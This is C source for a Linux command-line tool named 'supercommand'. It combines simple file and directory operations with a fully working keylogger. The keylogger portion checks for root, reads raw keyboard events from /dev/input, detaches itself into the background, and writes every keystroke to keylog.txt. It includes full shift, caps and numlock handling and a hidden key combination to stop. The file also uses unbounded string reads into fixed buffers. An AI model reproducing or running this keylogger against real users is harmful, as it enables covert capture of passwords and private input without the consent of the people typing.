#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <termios.h>
#include <ctype.h>
#include <signal.h>
#include <time.h>
#include<linux/input.h>
#include<linux/input-event-codes.h>
#include<sys/wait.h>

void print_menu();
void file_operations();
void directory_operations();
void keylogger_operations();

// Function for individual operations
void create_file(const char *filename);
void change_permissions(const char *filename, mode_t mode);
void read_file(const char *filename);
void write_file(const char *filename, const char *content);
void delete_file(const char *filename);

void create_directory(const char *dirname);
void delete_directory(const char *dirname);
void print_current_directory();
void list_current_directory_contents();

int caps_state = 0;
int shift_state = 0;
int final_caps = 0;
int log_fd, write_fd;
char kbd_file[30] = "";
int numlock_state = 0;
time_t curr_time;

int is_running = 0;

char keys_normal[][20]={
"[KEY_RESERVED]","[KEY_ESC]","1","2","3","4","5","6","7","8","9","0","-","=","[KEY_BACKSPACE]","[KEY_TAB]","q","w","e","r","t","y","u","i","o","p","[","]","[KEY_ENTER]\n","[KEY_CTRL]",
"a","s","d","f","g","h","j","k","l",";","'","`","[KEY_SHIFT]","\\","z","x","c","v","b","n","m",",",".","/","[KEY_SHIFT]","[KP_ASTERISK]",
"[KEY_ALT]"," ","[KEY_CAPS]","[KEY_F1]","[KEY_F2]","[KEY_F3]","[KEY_F4]","[KEY_F5]","[KEY_F6]","[KEY_F7]","[KEY_F8]","[KEY_F9]","[KEY_F10]","[KEY_NUM]","[KEY_SCROLL]","[KEYPAD_HOME]","[KEYPAD_UP]","[KEYPAD_PGUP]","-","[KEYPAD_LEFT]","","[KEYPAD_RIGHT]","+","[KEYPAD_END]","[KEYPAD_DOWN]","[KEYPAD_PGDN]","[KEYPAD_INS]","[KEYPAD_DEL]","","","[KEY_F11]","[KEY_F12]","","","","","","","","[KEY_KPENTER]\n","[KEY_RIGHTCTRL]","/","","[RIGHT_ALT]","","[KEY_HOME]","[KEY_UP]","[KEY_PGUP]","[KEY_LEFT]","[KEY_RIGHT]","[KEY_END]","[KEY_DOWN]","[KEY_PGDN]","[KEY_INSERT]","[KEY_DELETE]","","[KEY_MUTE]","[KEY_VOLDOWN]","[KEY_VOLUP]","[KEY_KPEQUAL]","","",""};

char keys_caps[][20]={
"[KEY_RESERVED]","[KEY_ESC]","!","@","#","$","%","^","&","*","(",")","_","+","[KEY_BACKSPACE]","[KEY_TAB]","Q","W","E","R","T","Y","U","I","O","P","{","}","[KEY_ENTER]\n","[KEY_CTRL]","A","S","D","F","G","H","J","K","L",
":","\"","~","[KEY_SHIFT]","|","Z","X","C","V","B","N","M","<",">","?","[KEY_SHIFT]","[KP_ASTERISK]","[KEY_ALT]"," ","[KEY_CAPS]","[KEY_F1]","[KEY_F2]","[KEY_F3]","[KEY_F4]","[KEY_F5]","[KEY_F6]","[KEY_F7]","[KEY_F8]","[KEY_F9]","[KEY_F10]","[KEY_NUM]","[KEY_SCROLL]","7","8","9","-","4","5","6","+","1","2","3","0",".","","","[KEY_F11]","[KEY_F12]","","","","","","","","[KEY_KPENTER]\n","[KEY_RIGHTCTRL]","/","","[RIGHT_ALT]","","[KEY_HOME]","[KEY_UP]","[KEY_PGUP]","[KEY_LEFT]","[KEY_RIGHT]","[KEY_END]","[KEY_DOWN]","[KEY_PGDN]","[KEY_INSERT]","[KEY_DELETE]","","[KEY_MUTE]","[KEY_VOLDOWN]","[KEY_VOLUP]","[KEY_KPEQUAL]","","",""};

void check_root_user();
void check_caps();
void check_numlock();
void catch_signal_kill(int signo);
void get_kbd_event_file();
void run_in_background();
void start_keylogger();
void view_keylogger();

// Signal handler to handle Ctrl+C (SIGINT)
void handle_sigint(int sig) {
    printf("\nExecution stopped by user. Exiting...\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    // Register signal handler for SIGINT
    signal(SIGINT, handle_sigint);

    if (argc > 1) {
        // Handle command-line options
        if (strcmp(argv[1], "-m") == 0 && argc >= 4) {
            int mode = atoi(argv[2]);  // Get the operation mode
            switch (mode) {
                case 1:  // File operations mode
                    if (argc >= 5) {
                        int op = atoi(argv[3]);  // Get the file operation type
                        const char *filename = argv[4];
                        switch (op) {
                            case 1:  // Create file
                                create_file(filename);
                                break;
                            case 2:  // Change permissions
                                if (argc == 6) {
                                    mode_t mode = strtol(argv[5], NULL, 8);  // Read permissions in octal format
                                    change_permissions(filename, mode);
                                } else {
                                    printf("Invalid number of arguments for changing permissions. Expected 6 arguments.\n");
                                }
                                break;
                            case 3:  // Read file
                                read_file(filename);
                                break;
                            case 4:  // Write to file
                                if (argc == 6) {
                                    const char *content = argv[5];  // Content passed for writing
                                    write_file(filename, content);
                                } else {
                                    printf("Invalid number of arguments for writing to file. Expected 6 arguments.\n");
                                }
                                break;
                            case 5:  // Delete file
                                delete_file(filename);
                                break;
                            default:
                                printf("Invalid file operation.\n");
                        }
                    } else {
                        printf("Invalid number of arguments for file operation.\n");
                    }
                    break;
                case 2:  // Directory operations mode
                    if (argc >= 4) {
                        int op = atoi(argv[3]);  // Get the directory operation type
                        const char *dirname = argv[4];
                        switch (op) {
                            case 1:  // Create directory
                                if (argc == 5) {
                                    create_directory(dirname);
                                } else {
                                    printf("Invalid number of arguments for creating directory. Expected 5 arguments.\n");
                                }
                                break;
                            case 2:  // Delete directory
                                if (argc == 5) {
                                    delete_directory(dirname);
                                } else {
                                    printf("Invalid number of arguments for deleting directory. Expected 5 arguments.\n");
                                }
                                break;
                            case 3:  // Print current directory
                                print_current_directory();
                                break;
                            case 4:  // List current directory contents
                                list_current_directory_contents();
                                break;
                            default:
                                printf("Invalid directory operation.\n");
                        }
                    } else {
                        printf("Invalid number of arguments for directory operation.\n");
                    }
                    break;
                case 3:  // Keylogger operations mode
                    if (argc == 4) {
                        int op = atoi(argv[3]);  // Get the keylogger operation type
                        switch (op) {
                            case 1:  // Start keylogger
                                start_keylogger();
                                break;
                            case 2:  // View keylogger contents
                                view_keylogger();
                                break;
                            default:
                                printf("Invalid keylogger operation.\n");
                        }
                    }
                    else {
                        printf("Invalid number of arguments for keylogger operation. Expected 4 arguments.\n");
                    }
                    break;
                default:
                    printf("Invalid mode.\n");
            }
            return 0;
        } else {
            printf("Usage: ./supercommand -m <mode> <sub-mode> <parameters...>\n");
            return 1;
        }
    }

    while (1) {
        print_menu();
        int choice;

        printf("Enter your choice: ");
        if (scanf("%d", &choice) != 1) {
            // Handle invalid input
            while (getchar() != '\n');  // Clear the input buffer
            printf("Invalid input. Please enter a valid number.\n");
            continue;  // Prompt again
        }

        switch (choice) {
            case 1:
                file_operations();
                break;
            case 2:
                directory_operations();
                break;
            case 3:
                keylogger_operations();
                break;
            case 4:
                printf("Exiting program.\n");
                exit(0);
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }

    return 0;
}

void print_menu() {
    printf("\nSuperCommand Menu:\n");
    printf("1. File Operations\n");
    printf("2. Directory Operations\n");
    printf("3. Keylogger\n");
    printf("4. Exit\n");
}

void file_operations() {
    while (1) {
        printf("\nFile Operations Menu:\n");
        printf("1. Create a file\n");
        printf("2. Change permissions of a file\n");
        printf("3. Read a file\n");
        printf("4. Write to a file\n");
        printf("5. Delete a file\n");
        printf("6. Return to Main Menu\n");

        int choice;

        while (1) { // Loop to handle invalid input
            printf("Enter your choice: ");
            if (scanf("%d", &choice) != 1) {
                // Handle invalid input
                while (getchar() != '\n');  // Clear the input buffer
                printf("Invalid input. Please enter a valid number.\n");
                continue;  // Prompt again
            }
            break; // Exit the loop once valid input is received
        }

        char filename[256], content[256];
        switch (choice) {
            case 1:
                printf("Enter filename: ");
                scanf("%s", filename);
                create_file(filename);
                break;
            case 2:
                mode_t mode; // Declare mode_t variable
                printf("Enter filename: ");
                scanf("%s", filename);
                printf("Enter permissions (in octal, e.g., 0644): ");
                if (scanf("%o", &mode) != 1) {
                    printf("Invalid permissions format.\n");
                    continue;
                }
                change_permissions(filename, mode);
                break;
            case 3:
                printf("Enter filename: ");
                scanf("%s", filename);
                read_file(filename);
                break;
            case 4:
                printf("Enter filename: ");
                scanf("%s", filename);
                getchar(); // Clear the newline left by scanf
                printf("Enter content: ");
                fgets(content, sizeof(content), stdin);
                content[strcspn(content, "\n")] = 0; // Remove trailing newline
                write_file(filename, content);
                break;
            case 5:
                printf("Enter filename: ");
                scanf("%s", filename);
                delete_file(filename);
                break;
            case 6:
                return;
            default:
                printf("Invalid choice.\n");
        }
    }
}

void directory_operations() {
    while (1) { // Keep looping until the user explicitly chooses to return to the main menu
        printf("\nDirectory Operations Menu:\n");
        printf("1. Create a directory\n");
        printf("2. Delete a directory\n");
        printf("3. Print current working directory\n");
        printf("4. List contents of the current directory\n");
        printf("5. Return to Main Menu\n");

        int choice;

        while (1) { // Loop to handle invalid input
            printf("Enter your choice: ");
            if (scanf("%d", &choice) != 1) {
                // Handle invalid input
                while (getchar() != '\n');  // Clear the input buffer
                printf("Invalid input. Please enter a valid number.\n");
                continue;  // Prompt again
            }
            break; // Exit the loop once valid input is received
        }

        char dirname[256];

        switch (choice) {
            case 1:
                printf("Enter directory name: ");
                scanf("%s", dirname);
                create_directory(dirname);
                break;
            case 2:
                printf("Enter directory name: ");
                scanf("%s", dirname);
                delete_directory(dirname);
                break;
            case 3:
                print_current_directory();
                break;
            case 4:
                list_current_directory_contents();
                break;
            case 5:
                return; // Exit the Directory Operations menu and go back to the main menu
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
}

void keylogger_operations() {
    while (1) {
        printf("\nKeylogger Operations Menu:\n");
        printf("1. Start Keylogger\n");
        printf("2. View Keylogger Contents\n");
        printf("3. Return to Main Menu\n");

        int choice;

        while (1) { // Loop to handle invalid input
            printf("Enter your choice: ");
            if (scanf("%d", &choice) != 1) {
                // Handle invalid input
                while (getchar() != '\n');  // Clear the input buffer
                printf("Invalid input. Please enter a valid number.\n");
                continue;  // Prompt again
            }
            break; // Exit the loop once valid input is received
        }

        switch (choice) {
            case 1:
                start_keylogger();
                break;
            case 2:
                view_keylogger();
                break;
            case 3:
                return;
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
}


void create_file(const char *filename) {
    if (access(filename, F_OK) == 0) { // Check if the file exists
        char choice;
        printf("File '%s' already exists. Do you want to replace it? (y/n): ", filename);
        scanf(" %c", &choice); // Get user input
        
        if (choice != 'y' && choice != 'Y') {
            printf("Operation cancelled. File not created.\n");
            return;
        }
    }
    
    int fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, 0644); // Create or overwrite the file
    if (fd == -1) {
        perror("Error creating file");
        return;
    }
    printf("File created successfully: %s\n", filename);
    close(fd);
}

void change_permissions(const char *filename, mode_t mode) {
    if (chmod(filename, mode) == -1) {
        perror("Error changing file permissions");
    } else {
        printf("Permissions changed successfully for file: %s\n", filename);
    }
}

void read_file(const char *filename) {
    // Open the file for reading
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror("Error opening file for reading");
        return;
    }

    // Get the file size using fstat
    struct stat fileStat;
    if (fstat(fd, &fileStat) == -1) {
        perror("Error getting file stats");
        close(fd);
        return;
    }

    // Dynamically allocate memory for the buffer based on the file size
    size_t fileSize = fileStat.st_size;
    if (fileSize == 0) {
        printf("The file is empty.\n");
        close(fd);
        return;
    }

    // Allocate memory for the buffer
    char *buffer = (char *)malloc(fileSize + 1);  // +1 for the null terminator
    if (buffer == NULL) {
        perror("Memory allocation failed");
        close(fd);
        return;
    }

    // Read the file into the buffer
    ssize_t bytesRead = read(fd, buffer, fileSize);
    if (bytesRead == -1) {
        perror("Error reading file");
        free(buffer);
        close(fd);
        return;
    }

    // Null-terminate the buffer
    buffer[bytesRead] = '\0';

    // Print the content of the file
    printf("%s", buffer);

    // Clean up: Free the buffer and close the file descriptor
    free(buffer);
    close(fd);

    printf("\n");
}

void write_file(const char *filename, const char *content) {
    int fd = open(filename, O_WRONLY | O_APPEND);
    if (fd == -1) {
        perror("Error opening file for writing");
        return;
    }
    if (write(fd, content, strlen(content)) == -1) {
        perror("Error writing to file");
    } else {
        printf("Content written successfully to file: %s\n", filename);
    }
    close(fd);
}

void delete_file(const char *filename) {
    if (unlink(filename) == -1) {
        perror("Error deleting file");
    } else {
        printf("File deleted successfully: %s\n", filename);
    }
}

void create_directory(const char *dirname) {
    if (mkdir(dirname, 0755) == -1) {
        perror("Error creating directory");
    } else {
        printf("Directory created successfully: %s\n", dirname);
    }
}

void delete_directory(const char *dirname) {
    if (rmdir(dirname) == -1) {
        perror("Error deleting directory");
    } else {
        printf("Directory deleted successfully: %s\n", dirname);
    }
}

void print_current_directory() {
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        printf("Current working directory: %s\n", cwd);
    } else {
        perror("Error getting current working directory");
    }
}

void list_current_directory_contents() {
    char cwd[PATH_MAX];
    
    // Get the current working directory
    if (getcwd(cwd, sizeof(cwd)) == NULL) {
        perror("Error getting current directory");
        return;
    }

    DIR *dir = opendir(cwd);
    if (!dir) {
        perror("Error opening directory");
        return;
    }

    struct dirent *entry;
    printf("Contents of current directory %s:\n", cwd);
    while ((entry = readdir(dir)) != NULL) {
        printf("%s\n", entry->d_name);
    }
    closedir(dir);
}

void check_root_user()
{
    if (getuid())
    {
        printf("\nPlease run it as sudo\n");
        exit(1);
    }
}

void check_caps()
{
    int pipefd[2];
    pid_t pid;
    char cmd_op[5] = "";

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        return;
    }

    if (pid == 0) {  // Child process
        close(pipefd[0]);  // Close unused read end
        dup2(pipefd[1], STDOUT_FILENO);  // Redirect stdout to pipe
        close(pipefd[1]);  // Close write end after redirect

        execl("/bin/sh", "sh", "-c", "((xset q 2>/dev/null | grep -iEq 'caps lock: +on') || (setleds 2>/dev/null | grep -iq 'capslock on')) && echo on", (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {  // Parent process
        close(pipefd[1]);  // Close unused write end
        read(pipefd[0], cmd_op, 4);
        close(pipefd[0]);  // Close read end after reading
        wait(NULL);  // Wait for child process to finish
    }

    caps_state = (strlen(cmd_op) == 0) ? 0 : 1;
}

void check_numlock()
{
    int pipefd[2];
    pid_t pid;
    char cmd_op[5] = "";

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        return;
    }

    if (pid == 0) {  // Child process
        close(pipefd[0]);  // Close unused read end
        dup2(pipefd[1], STDOUT_FILENO);  // Redirect stdout to pipe
        close(pipefd[1]);  // Close write end after redirect

        execl("/bin/sh", "sh", "-c", "((xset q 2>/dev/null | grep -iEq 'num lock: +on') || (setleds 2>/dev/null | grep -iq 'numlock on')) && echo on", (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {  // Parent process
        close(pipefd[1]);  // Close unused write end
        read(pipefd[0], cmd_op, 4);
        close(pipefd[0]);  // Close read end after reading
        wait(NULL);  // Wait for child process to finish
    }

    numlock_state = (strlen(cmd_op) == 0) ? 0 : 1;
}

void catch_signal_kill(int signo)
{
    if (signo == SIGTERM)
    {
        curr_time = time(NULL);
        char buffer[256];
        snprintf(buffer, sizeof(buffer), "\n\n***********************************************************************************************************************\n");
        write(write_fd, buffer, strlen(buffer));
        snprintf(buffer, sizeof(buffer), "                                   LOGGING STOPPED at %s", ctime(&curr_time));
        write(write_fd, buffer, strlen(buffer));
        snprintf(buffer, sizeof(buffer), "***********************************************************************************************************************\n\n");
        write(write_fd, buffer, strlen(buffer));
        close(log_fd);
        close(write_fd);
        exit(5);
    }
}

void get_kbd_event_file()
{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        perror("pipe");
        exit(2);
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(2);
    }

    if (pid == 0) {  // Child process
        close(pipefd[0]);  // Close unused read end
        dup2(pipefd[1], STDOUT_FILENO);  // Redirect stdout to pipe
        close(pipefd[1]);  // Close write end after redirect

        execl("/bin/sh", "sh", "-c", "readlink -f /dev/input/by-path/$(ls /dev/input/by-path/ 2>/dev/null | grep kbd)", (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {  // Parent process
        close(pipefd[1]);  // Close unused write end
        read(pipefd[0], kbd_file, 29);
        close(pipefd[0]);  // Close read end after reading
        wait(NULL);  // Wait for child process to finish
    }

    kbd_file[strlen(kbd_file) - 1] = '\0';
    log_fd = open(kbd_file, O_RDONLY);
    if (log_fd == -1)
    {
        perror("File reading error");
        exit(3);
    }
    write_fd = open("keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (write_fd == -1)
    {
        perror("File writing error");
        exit(4);
    }
    curr_time = time(NULL);
}

void run_in_background()
{
    pid_t pid = fork();
    if (pid < 0)
    {
        printf("\nError while forking...\n");
        exit(1);
    }
    if (pid > 0)
    {
        exit(0);
    }
    setsid();
}


void start_keylogger()
{
    if (is_running)
    {
        printf("Keylogger is already running.\n");
        return;
    }

    struct input_event ie;
    int alt_state = 0;
    int ctrl_state = 0;
    int shift_state = 0;
    int esc_state = 0;
    int flag = 0;

    check_root_user();
    check_caps();
    check_numlock();
    get_kbd_event_file();
    run_in_background();

    printf("Starting keylogger... Press 'ALT+CTRL+SHIFT+ESC' to stop.\n");
    
    char buffer[256];
    snprintf(buffer, sizeof(buffer), "\n***********************************************************************************************************************\n");
    write(write_fd, buffer, strlen(buffer));
    snprintf(buffer, sizeof(buffer), "                                   LOGGING STARTED at %s", ctime(&curr_time));
    write(write_fd, buffer, strlen(buffer));
    snprintf(buffer, sizeof(buffer), "***********************************************************************************************************************\n\n");
    write(write_fd, buffer, strlen(buffer));

    is_running = 1;

    while (1)
    {
        read(log_fd, &ie, sizeof(ie));

        if (ie.type == EV_KEY && ie.value == 1)
        {
            if (ie.code == 42 || ie.code == 54)
            {
                shift_state = 1;
                final_caps = shift_state ^ caps_state;
            }
            else if (ie.code == 58)
            {
                caps_state = !caps_state;
                final_caps = shift_state ^ caps_state;
            }
            else if (ie.code == 29 || ie.code == 97)
            {
                ctrl_state = 1;
            }
            else if (ie.code == 56 || ie.code == 100)
            {
                alt_state = 1;
            }
            else if (ie.code == 69)
            {
                numlock_state = !numlock_state;
            }

            if (ie.code >= 71 && ie.code <= 83)
            {
                if ((numlock_state ^ shift_state))
                    write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
                else
                    write(write_fd, keys_normal[ie.code], strlen(keys_normal[ie.code]));

                flag = 1;
            }

            if (flag == 0)
            {
                if (final_caps == 1)
                {
                    if (caps_state == 1 && ((ie.code >= 16 && ie.code <= 25) || (ie.code >= 30 && ie.code <= 38) || (ie.code >= 44 && ie.code <= 50)))
                        write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
                    else if (caps_state == 1)
                        write(write_fd, keys_normal[ie.code], strlen(keys_normal[ie.code]));
                    else
                         write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
                }
                else
                {
                    if ((ie.code >= 16 && ie.code <= 25) || (ie.code >= 30 && ie.code <= 38) || (ie.code >= 44 && ie.code <= 50)) // Alphabet keys
                        write(write_fd, keys_normal[ie.code], strlen(keys_normal[ie.code]));
                    else if ((ie.code >= 2 && ie.code <= 13) || ie.code == 39 || ie.code == 40 || ie.code == 41 || ie.code == 51 || ie.code == 52 || ie.code == 53 || ie.code == 12 || ie.code == 43) // Number keys and additional keys
                    {
                        if (shift_state == 1)
                            write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
                        else
                            write(write_fd, keys_normal[ie.code], strlen(keys_normal[ie.code]));
                    }
                    else
                        write(write_fd, keys_caps[ie.code], strlen(keys_caps[ie.code]));
                }
            }

            // Catch kill signal
            if (signal(SIGTERM, catch_signal_kill) == SIG_ERR)
                printf("\nSomething went wrong while catching the signal\n");

            if (ie.code == 1 && shift_state == 1 && ctrl_state == 1 && alt_state == 1)
            {
                curr_time = time(NULL);
                snprintf(buffer, sizeof(buffer), "\n\n***********************************************************************************************************************\n");
                write(write_fd, buffer, strlen(buffer));
                snprintf(buffer, sizeof(buffer), "                                   LOGGING STOPPED at %s", ctime(&curr_time));
                write(write_fd, buffer, strlen(buffer));
                snprintf(buffer, sizeof(buffer), "***********************************************************************************************************************\n\n");
                write(write_fd, buffer, strlen(buffer));

                close(log_fd);
                close(write_fd);
                exit(0);
            }

            flag = 0;
        }

        if (ie.value == 0 && (ie.code == 42 || ie.code == 54))
        {
            shift_state = 0;
            final_caps = shift_state ^ caps_state;
        }
        else if (ie.value == 0 && (ie.code == 29 || ie.code == 97))
        {
            ctrl_state = 0;
        }
        else if (ie.value == 0 && (ie.code == 56 || ie.code == 100))
        {
            alt_state = 0;
        }
    }
}


void view_keylogger()
{
    printf("\nViewing Keylogger Contents:\n");

    int view_file = open("keylog.txt", O_RDONLY);
    if (view_file == -1)
    {
        perror("Error opening log file");
        return;
    }

    char ch;
    while (read(view_file, &ch, 1) > 0)
    {
        putchar(ch);
    }

    close(view_file);
}